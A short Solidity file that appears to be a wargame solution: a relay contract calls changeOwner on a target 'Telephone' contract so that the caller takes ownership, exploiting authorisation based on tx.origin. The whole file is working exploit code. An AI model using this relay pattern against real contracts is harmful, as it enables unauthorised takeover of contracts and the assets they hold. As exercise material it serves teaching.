// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneRelay {
  function callTelephone(address _telephoneAddr) external {
      ITelephone(_telephoneAddr).changeOwner(msg.sender);
  }
}